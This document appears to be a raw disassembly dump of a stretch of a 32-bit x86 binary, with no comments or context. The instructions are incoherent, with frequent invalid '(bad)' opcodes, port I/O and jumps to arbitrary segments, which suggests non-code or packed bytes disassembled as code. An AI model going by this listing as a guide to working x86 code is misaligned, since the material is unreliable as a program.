  4181b9:	outs   dx,DWORD PTR ds:[esi]
  4181ba:	and    BYTE PTR [edx],cl
  4181bc:	jb     0x41819d
  4181be:	pusha  
  4181bf:	mov    ch,0xa0
  4181c1:	cmp    eax,0x30073dbd
  4181c6:	cs leave 
  4181c8:	cmp    edi,edx
  4181ca:	int3   
  4181cb:	out    dx,eax
  4181cc:	mov    WORD PTR [esi],cs
  4181ce:	mov    WORD PTR [edi],?
  4181d0:	fcom   QWORD PTR [edx-0x5d6d6bdf]
  4181d6:	(bad)  
  4181d7:	iret   
  4181d8:	mov    ch,0xff
  4181da:	scas   al,BYTE PTR es:[edi]
  4181db:	lock add eax,0x41a4f593
  4181e1:	inc    ebx
  4181e2:	ja     0x418189
  4181e4:	aam    0x93
  4181e6:	mov    ah,0x4d
  4181e8:	scas   al,BYTE PTR es:[edi]
  4181e9:	out    dx,eax
  4181ea:	nop
  4181eb:	repz sbb ch,BYTE PTR [ecx]
  4181ee:	mov    ecx,0x2b417f27
  4181f3:	loopne 0x418189
  4181f5:	fidiv  DWORD PTR ds:0x7140e04f
  4181fb:	xor    eax,DWORD PTR [esi]
  4181fd:	stos   DWORD PTR es:[edi],eax
  4181fe:	mov    dh,0xaa
  418200:	and    dh,cl
  418202:	les    ecx,FWORD PTR [ebp+0x53b6963a]
  418208:	dec    ebx
  418209:	mov    dl,0x50
  41820b:	int    0xcb
  41820d:	gs dec edx
  41820f:	rcr    DWORD PTR [ebx+0x5e356fcd],0x18
  418216:	pusha  
  418217:	aas    
  418218:	jecxz  0x41823f
  41821a:	jmp    0x4181f9
  41821c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41821d:	jmp    0x418213
  41821f:	shl    al,0x66
  418222:	jb     0x418295
  418224:	mov    DWORD PTR [eax+0x17],edx
  418227:	ror    DWORD PTR [edx+eax*1],0x69
  41822b:	jge    0x4181ce
  41822d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41822e:	ss das 
  418230:	sbb    BYTE PTR [ecx+0x1ea3738d],0xdd
  418237:	inc    ecx
  418238:	xor    eax,0x5f99dd07
  41823d:	inc    eax
  41823e:	arpl   WORD PTR [edi],di
  418240:	lock popa 
  418242:	jle    0x41822b
  418244:	pop    es
  418245:	les    esi,FWORD PTR [ebp-0x79]
  418248:	lods   al,BYTE PTR ds:[esi]
  418249:	xchg   edi,eax
  41824a:	fild   WORD PTR [eax]
  41824c:	rol    edi,0x31
  41824f:	push   edx
  418250:	and    ah,dl
  418252:	push   esp
  418253:	adc    ebp,DWORD PTR [ecx]
  418255:	or     eax,0x7fffe035
  41825a:	xchg   ecx,eax
  41825b:	imul   ecx,DWORD PTR [esp+edi*2+0x5f],0x5
  418260:	sub    dh,BYTE PTR [ebx+esi*2-0x1ea9b43a]
  418267:	sbb    eax,0xdda2d4b2
  41826c:	mov    ch,0x0
  41826e:	(bad)  
  41826f:	addr16 or al,0xf7
  418272:	or     eax,esp
  418274:	loopne 0x41827b
  418276:	pop    ds
  418277:	int    0xd6
  418279:	jbe    0x418215
  41827b:	push   edi
  41827c:	mov    esp,0x45caaff4
  418281:	in     eax,dx
  418282:	sahf   
  418283:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418284:	pushf  
  418285:	and    DWORD PTR [edi],ebx
  418287:	mov    ch,0x59
  418289:	pop    es
  41828a:	push   ebp
  41828b:	ds dec ebx
  41828d:	add    cl,bl
  41828f:	out    0x9,eax
  418291:	and    dh,0x96
  418294:	pusha  
  418295:	retf   0x42c1
  418298:	clc    
  418299:	xchg   edi,eax
  41829a:	or     eax,0xbf1b73c
  41829f:	(bad)  
  4182a1:	sub    DWORD PTR [edi-0x43],esp
  4182a4:	(bad)  
  4182a5:	js     0x41824f
  4182a7:	jmp    0x6bc2:0x651993b4
  4182ae:	xlat   BYTE PTR ds:[ebx]
  4182af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182b0:	cwde   
  4182b1:	fisubr WORD PTR [edx]
  4182b4:	adc    DWORD PTR [edi+0x56],eax
  4182b7:	jb     0x418337
  4182b9:	or     ebx,DWORD PTR [edx-0x1195c8f9]
  4182bf:	adc    cl,bl
  4182c1:	mov    eax,ebp
  4182c3:	mov    ds:0xb293df,eax
  4182c8:	push   edi
  4182c9:	add    BYTE PTR [eax+0xa],dl
  4182cc:	or     bl,BYTE PTR [esi+0x2b]
  4182cf:	ins    DWORD PTR es:[edi],dx
  4182d0:	push   esp
  4182d1:	sub    al,BYTE PTR [esi]
  4182d3:	in     al,0x20
  4182d5:	push   ebp
  4182d6:	mov    bh,0xf7
  4182d8:	fs xchg edx,eax
  4182da:	jmp    0x62cb:0x25e387fb
  4182e1:	mov    ah,0x64
  4182e3:	test   al,0xba
  4182e6:	ins    DWORD PTR es:[edi],dx
  4182e7:	cmp    dl,ch
  4182e9:	call   0xde94:0xb0e22e10
  4182f0:	jp     0x4182a0
  4182f2:	sbb    BYTE PTR [ecx-0x3f3caf28],bl
  4182f8:	mov    dh,BYTE PTR [esi+0x75bf2d3]
  4182fe:	sub    eax,0xa8022243
  418303:	test   eax,0xe2e5f39f
  418308:	push   eax
  418309:	cld    
  41830a:	mov    ds:0xb0db22df,al
  41830f:	cmp    al,0xb5
  418312:	aam    0x4d
  418314:	sub    edx,edx
  418316:	dec    edx
  418317:	pop    ebp
  418318:	pop    esp
  418319:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41831a:	lods   eax,DWORD PTR ds:[esi]
  41831b:	std    
  41831c:	(bad)  
  41831d:	sar    DWORD PTR [ecx+0x30],1
  418320:	add    ch,dh
  418322:	jbe    0x418392
  418324:	(bad)  
  418325:	push   es
  418326:	retf   0xda38
  418329:	scas   eax,DWORD PTR es:[edi]
  41832a:	xor    al,0x2b
  41832c:	dec    ebp
  41832d:	xor    eax,0x20315ce8
  418332:	sbb    al,BYTE PTR [ebx]
  418334:	fisttp DWORD PTR [edi+ebx*1]
  418337:	sbb    eax,DWORD PTR ds:0x244c5014
  41833d:	xchg   DWORD PTR [esi-0x48c6bc10],ebx
  418343:	std    
  418344:	cmp    DWORD PTR [ecx+ebp*8+0x3e],esi
  418348:	bound  ebp,QWORD PTR ds:0x65714865
  41834e:	test   DWORD PTR cs:[edx+ecx*8-0x1],ebp
  418353:	and    DWORD PTR [edx],eax
  418355:	jb     0x418300
  418357:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418358:	cmp    eax,DWORD PTR [ebp-0x63bce6f]
  41835e:	cmp    eax,0x6a6aedb
  418363:	and    al,0x44
  418365:	xchg   esp,eax
  418366:	xchg   edi,eax
  418367:	cmp    ebp,DWORD PTR [edi+ecx*8+0x4f39de0f]
  41836e:	cmc    
  41836f:	push   0xffffffef
  418371:	sbb    al,0xbf
  418373:	push   ebp
  418374:	arpl   WORD PTR [esi+edx*4-0xd],di
  418378:	jecxz  0x4182fe
  41837a:	and    BYTE PTR [ecx+0x2a],al
  41837d:	dec    esp
  41837e:	jnp    0x418342
  418380:	dec    esp
  418381:	inc    DWORD PTR [ebx]
  418383:	sar    bh,1
  418385:	push   es
  418386:	xor    BYTE PTR [edx],0x59
  418389:	jmp    0x418358
  41838b:	mov    ch,0x62
  41838d:	inc    esi
  41838e:	and    al,0xff
  418390:	aas    
  418391:	xor    ah,BYTE PTR [ebx]
  418393:	pop    ss
  418394:	sbb    edi,eax
  418396:	fistp  WORD PTR es:[eax-0x534b45af]
  41839d:	into   
  41839e:	mov    edx,0xbab8a4a4
  4183a3:	in     eax,0x1f
  4183a5:	push   edx
  4183a6:	adc    BYTE PTR es:[edx+ecx*2-0x3c],ah
  4183ab:	dec    edi
  4183ac:	xor    BYTE PTR [edx-0x1c],ch
  4183af:	jmp    0x4183aa
  4183b1:	shl    DWORD PTR fs:[esp+esi*1+0x3b],0xcb
  4183b7:	(bad)
  4183ba:	mov    ds:0xf2c960c8,al
  4183bf:	in     al,dx
  4183c0:	test   DWORD PTR [edi],esi
  4183c2:	jg     0x418421
  4183c4:	outs   dx,DWORD PTR ds:[esi]
  4183c5:	push   edi
  4183c6:	xor    al,0x52
  4183c8:	lahf   
  4183c9:	push   es
  4183ca:	and    dl,BYTE PTR [edi+0x40]
  4183cd:	test   DWORD PTR [edx+eax*1],ecx
  4183d0:	and    al,0x6e
  4183d2:	ret    
  4183d3:	mov    dl,0x29
  4183d5:	cmp    dl,bh
  4183d7:	aaa    
  4183d8:	and    eax,0xd2228ee3
  4183dd:	xchg   edx,eax
  4183de:	cmp    DWORD PTR [ecx-0x3ecab5be],0xfffffff8
  4183e5:	rol    BYTE PTR [edx],0x22
  4183e8:	push   esp
  4183e9:	mov    cl,0x0
  4183eb:	rol    DWORD PTR [edi+0x7b],1
  4183ee:	pop    edx
  4183ef:	imul   ebx,edi,0x1c
  4183f2:	mov    esp,0x301b2904
  4183f7:	sti    
  4183f8:	and    edi,DWORD PTR fs:[ebp-0x64]
  4183fc:	sub    al,0x36
  4183fe:	adc    esp,ecx
  418400:	sub    al,0x80
  418402:	fstp   QWORD PTR [ecx]
  418404:	mov    esp,0xa8ff6c1a
  418409:	add    eax,0x961dba59
  41840e:	and    bh,BYTE PTR [edx-0x237ee76]
  418414:	and    eax,0x6f5cc831
  418419:	dec    esp
  41841a:	pop    edi
  41841b:	loop   0x418467
  41841d:	add    esi,esp
  41841f:	and    cl,BYTE PTR [edx]
  418421:	cdq    
  418422:	dec    DWORD PTR [esi]
  418424:	jp     0x41841f
  418426:	mov    ds:0x6f216f6b,al
  41842b:	or     al,0x3
  41842d:	loop   0x418466
  41842f:	loopne 0x4183d7
  418431:	bound  ecx,QWORD PTR [edx]
  418433:	jg     0x418485
  418435:	rol    BYTE PTR [esi-0x552509c2],0x3b
  41843c:	add    dh,ah
  41843e:	pop    edi
  41843f:	imul   eax,DWORD PTR [esi-0x3d98daa8],0x3be2585d
  418449:	cmp    al,0x7
  41844b:	lods   al,BYTE PTR ds:[esi]
  41844c:	mov    ebp,ebp
  41844e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41844f:	fwait
  418450:	add    BYTE PTR [eax+0x29],bl
  418453:	arpl   WORD PTR es:[ecx],bx
  418456:	stc    
  418457:	ret    
  418458:	dec    esi
  418459:	es iret 
  41845b:	and    al,0xa2
  41845d:	xchg   edi,eax
  41845e:	jl     0x4184be
  418460:	stos   BYTE PTR es:[edi],al
  418461:	inc    ebp
  418462:	jo     0x418415
  418464:	(bad)  
  418465:	shl    BYTE PTR [eax-0x1378b7b2],cl
  41846b:	sub    DWORD PTR ds:0x28e6d9d0,esp
  418471:	dec    ebx
  418472:	retf   0x31eb
  418475:	repnz mov eax,0x697a2400
  41847b:	pusha  
  41847c:	add    eax,0x43d6b837
  418481:	(bad)  
  418482:	call   0x1cad2636
  418487:	aad    0x63
  418489:	sbb    ebp,DWORD PTR [edi-0x51]
  41848c:	mov    ecx,eax
  41848e:	loope  0x418449
  418490:	cmp    BYTE PTR [eax],0xf6
  418493:	jle    0x41843f
  418495:	jle    0x4184f6
  418497:	pushf  
  418498:	sub    ecx,DWORD PTR [ebx]
  41849a:	gs in  al,0xd5
  41849d:	dec    ecx
  41849e:	xchg   BYTE PTR [eax-0x63],cl
  4184a1:	adc    esi,DWORD PTR [esi-0x2d3c73df]
  4184a7:	fmul   st(5),st
  4184a9:	icebp  
  4184aa:	cwde   
  4184ab:	add    al,BYTE PTR [eax]
  4184ad:	jns    0x4184ad
  4184af:	popf   
  4184b0:	mov    BYTE PTR [edi-0x6f4c57fd],0x1a
  4184b7:	add    esp,ebx
  4184b9:	push   edi
  4184ba:	pushf  
  4184bb:	push   esi
  4184bc:	mov    ebx,eax
  4184be:	jae    0x418504
  4184c0:	mov    al,ds:0xc70a19f1
  4184c5:	jno    0x418470
  4184c7:	(bad)  
  4184c8:	and    eax,0xd079f804
  4184cd:	mov    ds:0x57180734,al
  4184d2:	test   edi,esi
  4184d4:	ffree  st(1)
  4184d6:	imul   DWORD PTR [esi+0x6a]
  4184d9:	sbb    al,bh
  4184db:	jns    0x41853a
  4184dd:	pusha  
  4184de:	jp     0x4184fc
  4184e0:	hlt    
  4184e1:	inc    edx
  4184e2:	add    edx,DWORD PTR ds:0xdceff1d
  4184e8:	inc    ebp
  4184e9:	jno    0x418548
  4184eb:	sti    
  4184ec:	lods   al,BYTE PTR ds:[esi]
  4184ed:	je     0x41848d
  4184ef:	inc    esp
  4184f0:	jl     0x41850b
  4184f2:	inc    edx
  4184f3:	fldenv [ecx+eax*2+0x728cd142]
  4184fa:	xchg   ecx,eax
  4184fb:	call   0x4583:0x8cdf4aeb
  418502:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418503:	cwde   
  418504:	fimul  WORD PTR [ebx+0x70ba8752]
  41850a:	(bad)  
  41850b:	leave  
  41850c:	loop   0x4184d2
  41850e:	(bad)  
  41850f:	hlt    
  418510:	jmp    0x1038796c
  418515:	(bad)  
  418516:	push   edi
  418517:	cmp    eax,DWORD PTR [ebx+0x3f]
  41851a:	out    0xae,al
  41851c:	mov    bh,0x4e
  41851e:	sbb    esp,esp
  418520:	into   
  418521:	xor    esi,ebx
  418523:	int3   
  418524:	inc    edx
  418525:	mov    BYTE PTR [ebp+esi*2+0x17476d38],dl
  41852c:	pop    ebp
  41852d:	push   cs
  41852e:	jb     0x4184ed
  418530:	(bad)  [ebp-0x7198637f]
  418536:	clc    
  418537:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418538:	data16 mov ch,0x9f
  41853b:	mov    ds:0x2ae1a519,al
  418540:	stos   DWORD PTR es:[edi],eax
  418541:	pop    ecx
  418542:	pop    edi
  418543:	xchg   BYTE PTR [ecx-0x35],bl
  418546:	sbb    BYTE PTR [edx-0x4b2216f5],cl
  41854c:	leave  
  41854d:	icebp  
  41854e:	xor    ebx,ebp
  418550:	scas   al,BYTE PTR es:[edi]
  418551:	pop    ss
  418552:	in     al,0x10
  418554:	js     0x4185cf
  418556:	mov    ebx,0x1a0149c7
  41855b:	jbe    0x4184ef
  41855d:	fcom   st(2)
  41855f:	(bad)  
  418561:	call   0x260b:0x6843c929
  418568:	fistp  DWORD PTR [esi-0x497e3bb0]
  41856e:	mov    bh,0x5f
  418570:	lock jo 0x41852b
  418573:	retf   
  418574:	outs   dx,BYTE PTR ds:[esi]
  418575:	rcl    ecx,cl
  418577:	lock sub ebp,DWORD PTR [edx-0x7b4f9e70]
  41857e:	adc    edi,ebp
  418580:	xchg   esi,eax
  418581:	(bad)
  418584:	ret    0x747e
  418587:	dec    ebx
  418588:	xor    BYTE PTR [esi],cl
  41858a:	daa    
  41858b:	pop    ds
  41858c:	and    ebp,eax
  41858e:	in     al,0x88
  418590:	mov    cl,0xe7
  418592:	sti    
  418593:	mov    ss:0xfbf743b6,eax
  418599:	push   esi
  41859a:	lods   eax,DWORD PTR ds:[esi]
  41859c:	and    bh,BYTE PTR [edi-0x5825a89e]
  4185a2:	das    
  4185a3:	in     eax,dx
  4185a4:	dec    edi
  4185a5:	add    DWORD PTR [ecx+0x6c],0x4f
  4185a9:	mov    ecx,0x583ae009
  4185ae:	dec    ebp
  4185af:	rol    BYTE PTR [ebx+0x734e1c3e],1
  4185b5:	data16 jp 0x4185eb
  4185b8:	popa   
  4185b9:	adc    al,0xc5
  4185bb:	mov    esi,DWORD PTR [edi]
  4185bd:	or     BYTE PTR [edi-0x4d1bfdc3],bh
  4185c3:	xor    esp,edx
  4185c5:	int    0xea
  4185c7:	pop    esi
  4185c8:	sbb    eax,0xc4dd36d3
  4185cd:	xchg   ebx,eax
  4185ce:	in     al,dx
  4185cf:	out    dx,eax
  4185d0:	cmp    al,0x8
  4185d2:	jp     0x4185ba
  4185d4:	pop    edi
  4185d5:	push   edi
  4185d6:	(bad)  
  4185d7:	and    al,0x47
  4185d9:	popf   
  4185da:	shr    BYTE PTR [eax+ecx*8],1
  4185dd:	add    BYTE PTR ds:0x85b5f8e2,dh
  4185e3:	fst    QWORD PTR [esi+0x19]
  4185e6:	loop   0x4185b4
  4185e8:	mov    ds:0xdfc0e852,eax
  4185ed:	fbstp  TBYTE PTR [eax-0x3f]
  4185f0:	pop    esi
  4185f1:	das    
  4185f2:	sub    DWORD PTR [edx+0x6a],eax
  4185f5:	dec    ebp
  4185f6:	sbb    eax,0xb7032731
  4185fb:	sbb    eax,0x5721f006
  418600:	sub    eax,0x471d5f49
  418605:	loope  0x41864c
  418607:	rol    DWORD PTR [ebp+0x35],0xc1
  41860b:	pop    es
  41860c:	mov    edx,0xfefee2a6
  418611:	push   0xffffff8a
  418613:	hlt    
  418614:	mov    ch,BYTE PTR [ecx+0x7c7d69dd]
  41861a:	(bad)  
  41861c:	sbb    ecx,DWORD PTR [eax-0x2cfd98dd]
  418622:	popa   
  418623:	jle    0x418644
  418625:	pop    es
  418626:	xchg   ebp,eax
  418627:	arpl   sp,di
  418629:	shl    DWORD PTR cs:[edi+ecx*2-0x351550b],cl
  418631:	pusha  
  418632:	xor    edi,esp
  418634:	(bad)  
  418637:	(bad)  
  418638:	jmp    0xe705:0x4d00b6bf
  41863f:	(bad)  
  418640:	bound  ecx,QWORD PTR [ebp+edi*1-0x331d583a]
  418647:	test   BYTE PTR [edi+edi*2-0x7f7c6734],dh
  41864e:	cld    
  41864f:	cmp    eax,0x3e7332e4
  418654:	jb     0x41868a
  418656:	push   esp
  418657:	adc    ecx,edi
  418659:	sub    al,0x1
  41865b:	inc    ecx
  41865c:	add    al,0x53
  41865e:	push   ebx
  41865f:	xor    eax,0xacf83477
  418664:	ret    0x6b8a
  418667:	adc    edi,0x5f56f6e9
  41866d:	clc    
  41866e:	xor    eax,0x71a67bbe
  418673:	mov    bh,0xae
  418675:	je     0x41866b
  418677:	adc    BYTE PTR [eax+0xa],0x2f
  41867b:	push   0x47f54f58
  418680:	xchg   ebx,eax
  418681:	cmp    eax,0xcd949432
  418686:	call   0xc9c0851b
  41868b:	xchg   BYTE PTR [ecx],ah
  41868d:	pop    esp
  41868e:	sti    
  41868f:	mov    ds:0x5a80b44d,eax
  418694:	neg    ecx
  418696:	cmp    DWORD PTR es:[esi+0x11],eax
  41869a:	data16 addr16 jle 0x4186fa
  41869e:	popf   
  41869f:	jmp    0x41870b
  4186a1:	(bad)  
  4186a3:	gs sub ebx,eax
  4186a6:	ds rsm 
  4186a9:	dec    ecx
  4186aa:	sar    BYTE PTR [edi],1
  4186ac:	lods   al,BYTE PTR ds:[esi]
  4186ad:	mov    eax,0xb743e02
  4186b2:	sbb    BYTE PTR [edi-0x4f20d9ae],cl
  4186b8:	mov    DWORD PTR [ecx+0x31],ecx
  4186bb:	and    esp,DWORD PTR ds:0x55f4a9f5
  4186c1:	push   ds
  4186c2:	add    eax,0x4df9cbcf
  4186c7:	or     esp,DWORD PTR [edx+0x4d]
  4186ca:	and    BYTE PTR [edi-0x2],0x15
  4186ce:	fisttp QWORD PTR [ebx-0x6e66e93a]
  4186d4:	dec    ecx
  4186d5:	jmp    ebp
  4186d7:	pop    ss
  4186d8:	(bad)  
  4186d9:	jmp    0x7ec:0xe6c1065f
  4186e0:	jg     0x41868c
  4186e2:	push   cs
  4186e3:	sti    
  4186e4:	das    
  4186e5:	test   BYTE PTR [ebx+0xa],cl
  4186e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186e9:	push   edi
  4186ea:	fistp  WORD PTR [ecx]
  4186ec:	or     ecx,ecx
  4186ee:	mov    edi,0x2e18cca3
  4186f3:	xchg   ebp,eax
  4186f4:	jmp    0x41876b
  4186f6:	lds    ebp,FWORD PTR [eax]
  4186f8:	mov    al,ds:0xfb405831
  4186fd:	sahf   
  4186fe:	call   0x48b9:0x34c8908c
  418705:	outs   dx,DWORD PTR ds:[esi]
  418706:	leave  
  418707:	push   ecx
  418708:	xor    DWORD PTR [esi-0xc],0x73078463
  41870f:	mov    al,BYTE PTR [edx]
  418711:	cdq    
  418712:	mov    esp,0xd29fb0d
  418717:	mov    eax,0xc86b1a7c
  41871c:	addr16 push esp
  41871e:	push   eax
  41871f:	inc    ecx
  418720:	int    0x56
  418722:	jns    0x418747
  418724:	push   0x45
  418726:	mov    BYTE PTR [eax-0x5cd20cdf],cl
  41872c:	je     0x418747
  41872e:	das    
  41872f:	pop    edi
  418730:	fidivr WORD PTR [edi]
  418732:	dec    edx
  418733:	push   ebx
  418734:	adc    ecx,eax
  418736:	fwait
  418737:	xchg   BYTE PTR [esp+esi*8],ch
  41873a:	(bad)  
  41873b:	lods   al,BYTE PTR ds:[esi]
  41873c:	cmp    al,0x68
  41873e:	mov    ds:0xeb2cff81,al
  418743:	jne    0x418753
  418745:	xchg   esp,eax
  418746:	aam    0x7c
  418748:	inc    esp
  418749:	cmp    BYTE PTR [ecx],ch
  41874b:	mov    al,ds:0xb8068079
  418750:	inc    ebx
  418751:	sub    dh,BYTE PTR ds:0x43ba1d78
  418757:	inc    edx
  418758:	fst    QWORD PTR [edx+0x66889680]
  41875e:	jmp    0x5733:0xd8b75ded
  418765:	out    0x4,eax
  418767:	add    DWORD PTR [edx],esi
  418769:	std    
  41876a:	repz jbe 0x418729
  41876d:	adc    al,0xf8
  41876f:	jp     0x4187b5
  418771:	test   al,0x5
  418773:	das    
  418774:	shr    BYTE PTR [ebp+eax*1-0x5dfbf2a6],cl
  41877b:	test   al,0x27
  41877d:	cmp    DWORD PTR [eax+ebx*8-0x2cbdaec7],ebp
  418784:	inc    edx
  418785:	mov    WORD PTR [ebx+0x38f04e31],?
  41878b:	adc    BYTE PTR [ecx+ecx*1-0x6a],dh
  41878f:	or     edx,DWORD PTR [esi+0x5d2d6132]
  418795:	xchg   esp,eax
  418796:	add    dl,ch
  418798:	inc    ebx
  418799:	sbb    DWORD PTR [ecx+0x1e],ebx
  41879c:	add    ah,BYTE PTR [eax+0x2c4739d6]
  4187a2:	xor    eax,0x920ef0bc
  4187a7:	retf   0xf277
  4187aa:	mov    DWORD PTR [eax],edx
  4187ac:	in     eax,0x8d
  4187ae:	arpl   WORD PTR [eax],bx
  4187b0:	into   
  4187b1:	jecxz  0x4187c0
  4187b3:	out    dx,al
  4187b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187b5:	es jmp 0xaec7:0x8bfdfb6
  4187bd:	mov    ds:0xfb05f407,eax
  4187c2:	nop
  4187c3:	out    0xd4,al
  4187c5:	out    dx,al
  4187c6:	leave  
  4187c7:	hlt    
  4187c8:	inc    ecx
  4187c9:	add    BYTE PTR [eax],0x5
  4187cc:	pop    edi
  4187cd:	daa    
  4187ce:	sar    BYTE PTR [edi+0xc1e70c4],cl
  4187d4:	xor    esp,DWORD PTR [ecx-0x7d]
  4187d7:	adc    al,0x40
  4187d9:	sub    esp,edi
  4187db:	mov    dl,0xee
  4187dd:	sti    
  4187de:	callw  0xee9a
  4187e2:	cmp    ebx,DWORD PTR [eax-0x21]
  4187e5:	mov    bh,0x8
  4187e7:	jns    0x418806
  4187e9:	test   DWORD PTR [eax],ecx
  4187eb:	xor    BYTE PTR [edx+0x22a2713a],cl
  4187f1:	out    dx,al
  4187f2:	inc    edi
  4187f3:	and    BYTE PTR [ecx],0xca
  4187f6:	inc    edi
  4187f7:	pop    edi
  4187f8:	or     DWORD PTR [ecx-0x224bad42],ecx
  4187fe:	frstor [esi+0x9]
  418801:	and    eax,0x58823f49
  418806:	stos   BYTE PTR es:[edi],al
  418807:	dec    ebp
  418808:	arpl   sp,ax
  41880a:	jg     0x418855
  41880c:	and    ebx,DWORD PTR [ebx-0x3b]
  41880f:	imul   edx,DWORD PTR [ebp+0x38],0xffffff96
  418813:	jnp    0x41886e
  418815:	inc    ebp
  418816:	xor    BYTE PTR [eax+0x53fff183],al
  41881c:	mov    bl,0x1b
  41881e:	xchg   ebx,eax
  41881f:	int    0xf1
  418821:	add    DWORD PTR [edi-0x20],eax
  418824:	sub    esp,DWORD PTR [edx-0x7b0c9997]
  41882a:	cli    
  41882b:	push   edi
  41882c:	inc    esp
  41882d:	fnstcw WORD PTR [eax]
  41882f:	gs fdiv st,st(7)
  418832:	sub    DWORD PTR [ebx+eax*2-0x1b],ecx
  418836:	in     al,0xa9
  418838:	scas   eax,DWORD PTR es:[edi]
  418839:	rol    DWORD PTR [eax+0x21],cl
  41883c:	and    edx,eax
  41883e:	iret   
  41883f:	(bad)  
  418840:	adc    eax,0xcac5493b
  418845:	(bad)  
  418846:	mov    bl,0x99
  418848:	ss std 
  41884a:	aad    0xa4
  41884c:	xchg   edi,eax
  41884d:	stos   DWORD PTR es:[edi],eax
  41884e:	loop   0x4187f1
  418850:	lods   al,BYTE PTR ds:[esi]
  418851:	jb     0x418842
  418853:	out    0x6c,eax
  418855:	xor    cl,ch
  418857:	das    
  418858:	cmp    ah,BYTE PTR [ebp-0x5af99f44]
  41885e:	dec    edx
  41885f:	xor    eax,0x2a8db928
  418864:	imul   eax,DWORD PTR [edx],0x6d
  418867:	call   0x6b9ffd06
  41886c:	enter  0x55f1,0xed
  418870:	cld    
  418871:	inc    ecx
  418872:	xor    DWORD PTR [eax+0x6d363c23],edi
  418878:	inc    esi
  418879:	mov    WORD PTR ds:0x9c7a9d84,cx
  418880:	push   ebx
  418881:	out    0xe8,al
  418883:	add    esp,DWORD PTR [ebx]
  418885:	out    dx,eax
  418886:	out    0x85,al
  418888:	test   al,0x17
  41888a:	cmc    
  41888b:	jnp    0x41888c
  41888d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41888e:	pop    ebp
  41888f:	push   eax
  418890:	in     al,0x79
  418892:	cmp    eax,DWORD PTR [edi-0x1c]
  418895:	inc    edx
  418896:	shl    ebp,1
  418898:	mov    ebx,0x328860bf
  41889d:	sbb    DWORD PTR [edx+esi*8-0x377b7e92],0xfffffffd
  4188a5:	and    al,0xf6
  4188a7:	mov    dh,0x8b
  4188a9:	out    0x63,eax
  4188ab:	mov    dh,0x89
  4188ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188ae:	iret   
  4188af:	fsub   DWORD PTR [edi]
  4188b1:	hlt    
  4188b2:	loop   0x41886f
  4188b4:	ret    0x783f
  4188b7:	sbb    dl,al
  4188b9:	outs   dx,DWORD PTR ds:[esi]
  4188ba:	sub    eax,0x6b473f23
  4188bf:	push   eax
  4188c0:	cs repz popf 
  4188c3:	or     eax,0x25c66092
  4188c8:	rcl    DWORD PTR [ebp+0x1820ec73],0x94
  4188cf:	(bad)  
  4188d1:	and    al,0x21
  4188d3:	pop    ds
  4188d4:	xor    eax,0xba6eb851
  4188d9:	mov    edi,DWORD PTR [eax+0x54034507]
  4188df:	sub    dh,0x45
  4188e2:	push   eax
  4188e3:	pop    edx
  4188e4:	push   edx
  4188e5:	add    BYTE PTR [ecx-0x56],ah
  4188e8:	clc    
  4188e9:	pop    ecx
  4188ea:	bnd jo 0x41890d
  4188ed:	jo     0x418937
  4188ef:	and    al,0xbf
  4188f1:	sar    DWORD PTR [eax],1
  4188f3:	imul   ebp,DWORD PTR [ebx+0x24e68968],0xffffffa5
  4188fa:	mov    al,ds:0xc1e4f083
  4188ff:	js     0x4188bd
  418901:	mov    edx,0x198af9f2
  418906:	jl     0x4188df
  418908:	imul   edi,DWORD PTR [esi+eax*2-0x37],0x723c08c6
  418910:	sbb    dl,al
  418912:	in     al,0xba
  418914:	and    ecx,0xe9562cf0
  41891a:	data16 test al,0x81
  41891d:	jo     0x41896b
  41891f:	ja     0x41892b
  418921:	cmp    al,BYTE PTR [ecx-0x9]
  418924:	jmp    0x8a1c5525
  418929:	test   al,0x5b
  41892b:	mov    cl,0x57
  41892d:	test   DWORD PTR [ecx+ecx*2],ecx
  418930:	and    DWORD PTR [edi+0x2cfe59df],esi
  418936:	aad    0xc7
  418938:	aas    
  418939:	fld    DWORD PTR [ebx-0x4f6bef76]
  41893f:	ja     0x41896d
  418941:	push   0xe
  418943:	pop    edi
  418944:	js     0x4188ca
  418946:	mov    eax,0xd86b2c8a
  41894b:	cdq    
  41894c:	and    BYTE PTR [ebp-0x3e3bd284],bh
  418952:	jge    0x4188d9
  418954:	sub    al,0x88
  418956:	and    al,0x96
  418958:	inc    esp
  418959:	inc    edi
  41895a:	lock ja 0x4189d4
  41895d:	cwde   
  41895e:	hlt    
  41895f:	mov    dh,0x8a
  418961:	jb     0x418979
  418963:	jg     0x418986
  418965:	or     al,0x90
  418967:	mov    ds:0xf27ba23d,eax
  41896c:	jmp    0xb75d89e5
  418971:	push   edx
  418972:	mov    gs,WORD PTR [edx]
  418974:	js     0x418988
  418976:	xchg   ecx,eax
  418977:	or     ch,ah
  418979:	sub    al,0x24
  41897b:	fstp   DWORD PTR [edx]
  41897d:	adc    eax,0x2f8f0f57
  418982:	jmp    0x4ef:0x8e2f8e09
  418989:	fisttp DWORD PTR [edx]
  41898b:	pop    eax
  41898c:	ja     0x4189f9
  41898e:	inc    edx
  41898f:	pop    ss
  418990:	les    edx,FWORD PTR [eax+ebp*1]
  418993:	call   0xc1eb:0xe68c3f73
  41899a:	cld    
  41899b:	sub    BYTE PTR [edx-0x22],ah
  41899e:	and    BYTE PTR [ebp-0xb],cl
  4189a1:	(bad)  
  4189a2:	fild   QWORD PTR ds:[esi]
  4189a5:	jecxz  0x418983
  4189a7:	push   ebx
  4189a8:	std    
  4189a9:	sti    
  4189aa:	sbb    BYTE PTR [ecx-0x5183a19a],ch
  4189b0:	push   0xffffffb4
  4189b2:	pop    ecx
  4189b3:	jl     0x418977
  4189b5:	retf   
  4189b6:	xor    DWORD PTR [ecx+0x3d],ebp
  4189b9:	mov    edi,0x2f2743aa
  4189be:	nop
  4189bf:	push   ss
  4189c0:	adc    BYTE PTR [edi-0x7d2f991b],dl
